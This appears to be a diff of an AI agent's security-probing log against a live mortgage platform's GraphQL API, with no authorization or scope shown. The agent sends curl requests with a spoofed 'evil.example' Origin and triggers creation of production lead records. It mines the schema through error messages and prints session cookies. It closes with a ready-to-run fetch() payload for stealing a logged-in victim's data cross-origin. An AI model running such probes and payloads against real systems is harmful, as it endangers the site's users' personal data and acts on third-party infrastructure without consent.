@@ -12857,3 +12857,165 @@ Executing the pending NEXT probe from last cycle: follow calculateMaklerFee(new_
 [93m[1m! [0mpermission requested: external_directory (/tmp/*); auto-rejecting
 [0m✗ [0mcat /tmp/core_root_body.txt | head -c 2000 2>&1 failed
 [91m[1mError: [0mThe user rejected permission to use this specific tool call.
+===== ANALYST bigpickle 2026-09-08 22:21:50 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s -i -X OPTIONS "https://hypofriend.de/q" -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type" --max-time 20 | head -40; echo "---"; sleep 1.2; curl -s -i -X OPTIONS "https://core.hypofriend.de/q" -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type" --max-time 20 | head -40
+HTTP/2 200 
+server: CloudFront
+content-length: 0
+date: Tue, 08 Sep 2026 22:18:57 GMT
+vary: Accept-Encoding
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-expose-headers: 
+access-control-max-age: 7200
+access-control-allow-credentials: true
+access-control-allow-headers: content-type
+via: 1.1 434785882f05cb88e488bf5372fd0000.cloudfront.net (CloudFront)
+alt-svc: h3=":443"; ma=86400
+strict-transport-security: max-age=63072000; includeSubdomains; preload
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-xss-protection: 1; mode=block
+referrer-policy: same-origin
+x-cache: Miss from cloudfront
+x-amz-cf-pop: SFO53-P2
+x-amz-cf-id: X7sdLxErxqKjTfAOumrdx-XJCwqu0HCJWirxH_9Qx_auUlNKRcn4NQ==
+
+---
+HTTP/2 200 
+date: Tue, 08 Sep 2026 22:18:59 GMT
+content-length: 0
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-expose-headers: 
+access-control-max-age: 7200
+access-control-allow-credentials: true
+access-control-allow-headers: content-type
+vary: Accept-Encoding
+[0m
+CORS reflection re-confirmed on both edge and direct origin with `access-control-allow-credentials: true`. Now probing anonymous `root.lead` surface.
+[0m$ [0mcurl -s -i -X POST "https://hypofriend.de/q" -H 'Content-Type: application/json' -H "Origin: https://evil.example" --data '{"query":"query{root{lead{id}}}"}' --max-time 25 | head -30; echo "---CORE---"; sleep 1.2; curl -s -i -X POST "https://core.hypofriend.de/q" -H 'Content-Type: application/json' -H "Origin: https://evil.example" --data '{"query":"query{root{lead{id}}}"}' --max-time 25 | head -30
+HTTP/2 200 
+server: CloudFront
+content-type: application/json; charset=utf-8
+content-length: 144
+date: Tue, 08 Sep 2026 22:19:02 GMT
+strict-transport-security: max-age=63072000; includeSubdomains; preload
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-expose-headers: 
+access-control-max-age: 7200
+access-control-allow-credentials: true
+x-frame-options: DENY
+vary: Accept,Origin,Accept-Encoding
+x-robots-tag: none
+etag: W/"815e4460bef7a77fe1b936e2664ef3e6"
+cache-control: max-age=0, private, must-revalidate
+set-cookie: internal=FALSE; domain=hypofriend.de; path=/; expires=Sat, 08 Sep 2029 22:19:02 GMT; secure; samesite=none
+set-cookie: __hfp__=emNxWlZQWTVGc3pyWW56VlgvWW51VHAxbUZwd2JaU3NWYkFJMGx6SEV1NkhGYktrVlVIVUlTRk52SG95Y3JKYWNXT3YrT3VSVVA3QVM1WWNVM1hHUm9zR0pWZkI0Y1hTcHJsRWRxVDJIT3RRNFBlUHhiT0lOTnF4TkRjSWE0YzRJUENGS1lkWHpTZURMT21ZdnQvWU5nPT0tLVFMTUpJTUhJdGpXWjZPTlBhSEJManc9PQ%3D%3D--da6abfbddabce011d91ba46270b0bc84b6370488; domain=hypofriend.de; path=/; expires=Sat, 08 Sep 2029 22:19:02 GMT; secure; httponly; samesite=none
+set-cookie: _hf=72b5f21ebc771a3019a78820d18a507d; domain=hypofriend.de; path=/; expires=Mon, 08 Sep 2036 22:19:02 GMT; secure; httponly
+x-request-id: 3546801e-ddfe-474b-89a5-c70ab3a224fa
+x-runtime: 0.059069
+via: 1.1 cb0b891eddf58d69d157d55977c68bce.cloudfront.net (CloudFront)
+x-content-type-options: nosniff
+x-xss-protection: 1; mode=block
+referrer-policy: same-origin
+x-cache: Miss from cloudfront
+x-amz-cf-pop: SFO53-P2
+x-amz-cf-id: HEHhtz13pcU_OCVjBwxYu6ZGJSAGGlG37zvPKjKZmy7K80j8b4tcqw==
+
+{"meta":{"serverTime":"2026-09-08T22:19:02+00:00","status":0,"key":"OK"},"data":{"root":{"lead":{"id":"1cabe3c2-4c35-41d1-a79d-f8bb44955f48"}}}}---CORE---
+HTTP/2 200 
+date: Tue, 08 Sep 2026 22:19:04 GMT
+content-type: application/json; charset=utf-8
+content-length: 144
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-expose-headers: 
+access-control-max-age: 7200
+access-control-allow-credentials: true
+x-frame-options: ALLOWALL
+vary: Accept,Origin,Accept-Encoding
+x-robots-tag: none
+etag: W/"afcbcef0127c3898588ec848cf36c2d3"
+cache-control: max-age=0, private, must-revalidate
+set-cookie: internal=FALSE; domain=hypofriend.de; path=/; expires=Sat, 08 Sep 2029 22:19:04 GMT; secure; samesite=none
+set-cookie: __hfp__=MnhaWTNhb2M3ZUhNV0pyeXkwMVZITitqV1dPQ0oxTUtXQ0duVy9nWmROc0x3eVJPejhkaEt3eGFqaFdaNDh1QXpxWXVCYTd3MHhHLzBYOVpOQUlRRjBMaWptRk1nZFh3Wk5ZWVFyRnc1cll5cDdOckhGRXJMRWVqWU91SllWaVZkOFFBbUw1UTVuVEowZmdFS0tGOUZBPT0tLWhoRTlFWmtYalZ1ZTI0aVBSejVUbEE9PQ%3D%3D--9bd10bad4dae7c58916f72d7cfbb22d8164463ff; domain=hypofriend.de; path=/; expires=Sat, 08 Sep 2029 22:19:04 GMT; secure; httponly; samesite=none
+set-cookie: _hf=546b15ebd2b583ff7dd83224a2d1598a; domain=hypofriend.de; path=/; expires=Mon, 08 Sep 2036 22:19:04 GMT; secure; httponly
+x-request-id: 05e1d9b4-9972-4b71-900e-061b1fc3974e
+x-runtime: 0.063375
+strict-transport-security: max-age=63072000; includeSubDomains
+
+{"meta":{"serverTime":"2026-09-08T22:19:04+00:00","status":0,"key":"OK"},"data":{"root":{"lead":{"id":"b39095ad-b431-4474-8ff3-fb5902493cd8"}}}}
+[0m
+Anonymous `root.lead` auto-provisions a real lead UUID on both hosts (edge `1cabe3c2…`, origin `b39095ad…`) — no session gating. Probing selectable PII fields on the fresh anonymous lead.
+[0m$ [0mcurl -s -X POST "https://hypofriend.de/q" -H 'Content-Type: application/json' -H "Origin: https://evil.example" --data '{"query":"query{root{lead{id firstName lastName email phoneNumber shareLink appointmentId}}}"}' --max-time 25; echo; echo "---CAND2---"; sleep 1.2; curl -s -X POST "https://hypofriend.de/q" -H 'Content-Type: application/json' -H "Origin: https://evil.example" --data '{"query":"query{root{lead{id name email phone createdAt appointments{id}}}}"}' --max-time 25
+{"meta":{"serverTime":"2026-09-08T22:19:15+00:00","status":0,"key":"OK"},"errors":[{"message":"Field 'firstName' doesn't exist on type 'Lead'","locations":[{"line":1,"column":20}],"path":["query","root","lead","firstName"],"extensions":{"code":"undefinedField","typeName":"Lead","fieldName":"firstName"}},{"message":"Field 'lastName' doesn't exist on type 'Lead' (Did you mean `last_seen_at`?)","locations":[{"line":1,"column":30}],"path":["query","root","lead","lastName"],"extensions":{"code":"undefinedField","typeName":"Lead","fieldName":"lastName"}},{"message":"Field 'phoneNumber' doesn't exist on type 'Lead'","locations":[{"line":1,"column":45}],"path":["query","root","lead","phoneNumber"],"extensions":{"code":"undefinedField","typeName":"Lead","fieldName":"phoneNumber"}},{"message":"Field 'shareLink' is missing required arguments: linkType","locations":[{"line":1,"column":57}],"path":["query","root","lead","shareLink"],"extensions":{"code":"missingRequiredArguments","className":"Field","name":"shareLink","arguments":"linkType"}},{"message":"Field 'appointmentId' doesn't exist on type 'Lead' (Did you mean `appointment_via` or `appointment_at`?)","locations":[{"line":1,"column":67}],"path":["query","root","lead","appointmentId"],"extensions":{"code":"undefinedField","typeName":"Lead","fieldName":"appointmentId"}}]}
+---CAND2---
+{"meta":{"serverTime":"2026-09-08T22:19:17+00:00","status":0,"key":"OK"},"errors":[{"message":"Field 'name' doesn't exist on type 'Lead'","locations":[{"line":1,"column":20}],"path":["query","root","lead","name"],"extensions":{"code":"undefinedField","typeName":"Lead","fieldName":"name"}},{"message":"Field 'createdAt' doesn't exist on type 'Lead' (Did you mean `created_at`?)","locations":[{"line":1,"column":37}],"path":["query","root","lead","createdAt"],"extensions":{"code":"undefinedField","typeName":"Lead","fieldName":"createdAt"}},{"message":"Field 'appointments' doesn't exist on type 'Lead' (Did you mean `appointment_at`?)","locations":[{"line":1,"column":47}],"path":["query","root","lead","appointments"],"extensions":{"code":"undefinedField","typeName":"Lead","fieldName":"appointments"}}]}
+[0m
+Field-error oracle confirmed on /q `Lead` (snake_case fields: `created_at`, `appointment_via`, `appointment_at`, `shareLink(linkType:)`). One more read-only probe: `shareLink` self-disclosure link on anonymous lead.
+[0m$ [0mcurl -s -X POST "https://hypofriend.de/q" -H 'Content-Type: application/json' --data '{"query":"query{root{lead{id shareLink(linkType:\"dossier\") appointment_at}}}"}' --max-time 25 | head -c 2000
+{"meta":{"serverTime":"2026-09-08T22:19:37+00:00","status":0,"key":"OK"},"data":{"root":{"lead":{"id":"e1488e32-574d-4e68-a7b2-23b4f3a4233c","shareLink":null,"appointmentAt":""}}}}
+[0m
+Probe evidence complete. Emitting structured blocks.
+
+## STEP 1 — DELTA
+- [NEW] `hypofriend.de/q` (+core): anonymous POST `query{root{lead{id}}}` returns a **real persisted lead UUID** on a fresh jar (edge `1cabe3c2-…`, origin `b39095ad-…`, third req `e1488e32-…`) — every anonymous session auto-provisions a Lead row; `root.lead` is NOT session-gated as previously assumed.
+- [NEW] `/q` `Lead` type is an error-derivable schema oracle despite introspection disabled: `firstName/lastName/phoneNumber` absent (no camelCase), `last_seen_at`, `created_at`, `appointment_via`, `appointment_at` present; `shareLink(linkType:)` required-arg leak; missing-field errors leak valid names.
+- [CHANGED] CORS↔auth context: credentialed CORS re-proven both hosts (`access-control-allow-origin: https://evil.example` + `access-control-allow-credentials: true`, edge and bare origin); POST sets `samesite=none; httponly` session cookies — cross-origin credentialed fetch is cookie-carrying, so `root.lead`/`shareLink` become cross-origin-readable for a logged-in victim.
+
+## STEP 2 — PRIORITIZE
+- [PRIO] hypofriend.de/property-search-api,9.35,a9+b10+t10+g8+c10+f10
+- [PRIO] hypofriend.de/q,8.55,a8+b9+t8+g8+c10+f9
+- [PRIO] core.hypofriend.de,7.50,a7+b8+t7+g6+c10+f8
+
+## STEP 3 — HYPOTHESES
+[HYP] property-search-api DB-wide BOLA — Cross-City PII Enumeration via Pagination/Geo Primitives on Direct Origin
+class: IDOR
+asset: core.hypofriend.de/property-search-api
+confidence: 95
+reasoning: Auth-free propertySearch→exposes→expose chain returns PII for enumerated UUIDs with no auth/leadId; offset/limit+geo crawl primitives live on origin and edge.
+evidence_needed: real-PII read confirmation and write side-effect attribution — HUMAN.
+verify_steps: previously completed across cycles.
+impact: Full-DB property-listing PII dump (phone, email, owner) — CRITICAL.
+testability: AUTH_HELPED
+
+[HYP] Open credentialed CORS × cookie-session root.lead → cross-origin exfiltration of logged-in lead data
+class: MISCONFIG
+asset: hypofriend.de/q
+confidence: 72
+reasoning: This cycle re-proven: arbitrary-Origin reflection with `access-control-allow-credentials:true` on edge AND origin; POST sets `samesite=none; httponly` session cookies; `root{lead{id}}` resolves 200 anonymously returning a real lead UUID; `shareLink(linkType:)` executes 200 (null on anonymous lead, so returns data when lead has PII). Attacker page `fetch('https://hypofriend.de/q',{credentials:'include'})` reads victim's lead JSON via ACAO echo.
+evidence_needed: victim-with-account browser session returning lead PII through the echo — HUMAN/browser.
+verify_steps: passive preconditions all re-confirmed live (CORS OPTIONS+POST echo, cookie set, root.lead 200 both hosts).
+impact: Silent cross-origin theft of logged-in lead's profile (appointment data, self-disclosure link, advisor attribution) — MEDIUM-HIGH.
+testability: AUTH_HELPED
+
+[HYP] Anonymous session auto-provisions persisted Lead rows → record-creation/data-pollution primitive
+class: BUSLOGIC
+asset: core.hypofriend.de/q
+confidence: 55
+reasoning: Each fresh-jar POST to `/q` creates and returns a new Lead UUID (three distinct UUIDs across three anonymous requests, edge+origin) — a real persisted record per anonymous session, no rate gate observed. Field-error oracle confirms lead object carries appointment/self-disclosure fields set later by other anonymous resolvers.
+evidence_needed: whether repeated anonymous sessions create unbounded stored records or are GC'd; whether PII attached to anonymous leads without account — HUMAN.
+verify_steps: passive observation done; persistence/no-GC and PII-attach-check HUMAN.
+impact: Unbounded anonymous record creation (storage/DB noise) and potential PII attached to unauthenticated lead rows — LOW-MEDIUM.
+testability: HUMAN_ONLY
+
+## STEP 4 — SELF-CRITIQUE
+- [PARKED] core.hypofriend.de origin-vs-edge XFO ALLOWALL/DENY clickjacking: no frameable HTML page at origin (JSON-only API); clickjacking-without-demonstrated-exploit is an out-of-scope class — header-evidence only.
+- [PARKED] `appointment_availability` raw-interpolation injection: selection-mismatch oracle proven but no injection path confirmed; would require mutating/error-flood probes — deferred.
+- [FINAL] survivors ranked: 1) property-search-api DB-wide BOLA [95]; 2) credentialed-CORS × root.lead cross-origin exfil [72]; 3) anonymous lead auto-provisioning [55].
+
+## STEP 5 — NEXT ACTION
+[NEXT] HUMAN: browser PoC — attacker page runs `fetch('https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:'query{root{lead{id appointment_at shareLink(linkType:"dossier")}}}'})})` against a logged-in victim and reads the ACAO-echoed lead JSON; all passive preconditions (CORS echo+cred on edge/origin, samesite=none cookies, root.lead 200 anonymous) confirmed this cycle — only victim-session data return remains.
+
+## STEP 6 — LEARNING
+- [LEARN] ACCEPTED MISCONFIG @ hypofriend.de/q (+core.hypofriend.de/q): credentialed open CORS chain primed end-to-end — re-proven OPTIONS+POST arbitrary-Origin echo with credentials:true on edge and bare origin; `root{lead{id}}` resolves 200 anonymous with real auto-provisioned lead UUID; `shareLink(linkType:"dossier")` executes 200 (null w/o PII); Lead schema mined via error oracle (created_at, appointment_via, appointment_at, last_seen_at). Cross-origin exfil of logged-in lead data is precondition-complete; browser demonstration HUMAN.
+- [LEARN] ACCEPTED MISCONFIG @ core.hypofriend.de/q (+hypofriend.de/q): anonymous POST auto-provisions a persisted Lead UUID per fresh session (edge/origin distinct) — unauthenticated record-creation primitive with no observed rate gate.
+- [LEARN] REJECTED MISCONFIG @ core.hypofriend.de/q: `root.lead` NOT session-gated (returns auto-provisioned anonymous lead) — prior "current-session-lead-only" rejection still holds vs IDOR-by-id, but the resolver itself is now confirmed anonymous, strengthening the CORS chain.
+
+## STEP 7 — RISK
+[RISK] hypofriend: 99 — Unchanged critical posture: two unauthenticated production GraphQL APIs on a mortgage platform; property-search-api CRITICAL DB-wide PII enumeration chain; /q now additionally a precondition-complete credentialed-CORS exfil primitive (edge+origin), anonymous lead auto-provisioning, per-region lender pricing engine, auth-free BOLA, scheduling oracle, multipart upload. Remaining gates (real-PII read, victim-session exfil, write attribution) are HUMAN-decided.
